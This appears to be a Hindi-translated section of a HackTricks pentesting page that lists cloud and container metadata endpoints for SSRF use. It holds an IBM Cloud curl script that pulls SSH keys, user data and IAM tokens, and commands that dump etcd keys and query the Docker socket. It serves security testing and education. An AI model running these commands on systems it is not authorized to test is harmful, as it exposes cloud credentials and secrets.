## IBM Cloud <a href="#id-2af0" id="id-2af0"></a>

> [!WARNING]
> ध्यान दें कि IBM में डिफ़ॉल्ट रूप से मेटाडेटा सक्षम नहीं है, इसलिए यह संभव है कि आप इसे एक्सेस नहीं कर पाएंगे, भले ही आप IBM क्लाउड VM के अंदर हों।
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
-H "Metadata-Flavor: ibm"\
-H "Accept: application/json"\
-d '{
"expires_in": 3600
}' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
विभिन्न प्लेटफार्मों की मेटाडेटा सेवाओं के लिए दस्तावेज़ नीचे उल्लिखित हैं, जो उन तरीकों को उजागर करते हैं जिनके माध्यम से उदाहरणों के लिए कॉन्फ़िगरेशन और रनटाइम जानकारी तक पहुंचा जा सकता है। प्रत्येक प्लेटफ़ॉर्म अपनी मेटाडेटा सेवाओं तक पहुँचने के लिए अद्वितीय एंडपॉइंट प्रदान करता है।

## Packetcloud

Packetcloud के मेटाडेटा तक पहुँचने के लिए, दस्तावेज़ यहाँ पाया जा सकता है: [https://metadata.packet.net/userdata](https://metadata.packet.net/userdata)

## OpenStack/RackSpace

यहाँ हेडर की आवश्यकता का उल्लेख नहीं किया गया है। मेटाडेटा तक पहुँचने के लिए:

- `http://169.254.169.254/openstack`

## HP Helion

यहाँ भी हेडर की आवश्यकता का उल्लेख नहीं किया गया है। मेटाडेटा यहाँ उपलब्ध है:

- `http://169.254.169.254/2009-04-04/meta-data/`

## Oracle Cloud

Oracle Cloud विभिन्न मेटाडेटा पहलुओं तक पहुँचने के लिए कई एंडपॉइंट प्रदान करता है:

- `http://192.0.0.192/latest/`
- `http://192.0.0.192/latest/user-data/`
- `http://192.0.0.192/latest/meta-data/`
- `http://192.0.0.192/latest/attributes/`

## Alibaba

Alibaba मेटाडेटा तक पहुँचने के लिए एंडपॉइंट प्रदान करता है, जिसमें उदाहरण और छवि आईडी शामिल हैं:

- `http://100.100.100.200/latest/meta-data/`
- `http://100.100.100.200/latest/meta-data/instance-id`
- `http://100.100.100.200/latest/meta-data/image-id`

## Kubernetes ETCD

Kubernetes ETCD API कुंजी, आंतरिक IP पते और पोर्ट रख सकता है। पहुँच इस प्रकार प्रदर्शित की गई है:

- `curl -L http://127.0.0.1:2379/version`
- `curl http://127.0.0.1:2379/v2/keys/?recursive=true`

## Docker

Docker मेटाडेटा को स्थानीय रूप से एक्सेस किया जा सकता है, जिसमें कंटेनर और छवि जानकारी पुनर्प्राप्त करने के उदाहरण दिए गए हैं:

- Docker सॉकेट के माध्यम से कंटेनरों और छवियों के मेटाडेटा तक पहुँचने के लिए सरल उदाहरण:
- `docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash`
- कंटेनर के अंदर, Docker सॉकेट के साथ curl का उपयोग करें:
- `curl --unix-socket /var/run/docker.sock http://foo/containers/json`
- `curl --unix-socket /var/run/docker.sock http://foo/images/json`

## Rancher

Rancher के मेटाडेटा तक पहुँचने के लिए:

- `curl http://rancher-metadata/<version>/<path>`

{{#include ../../banners/hacktricks-training.md}}
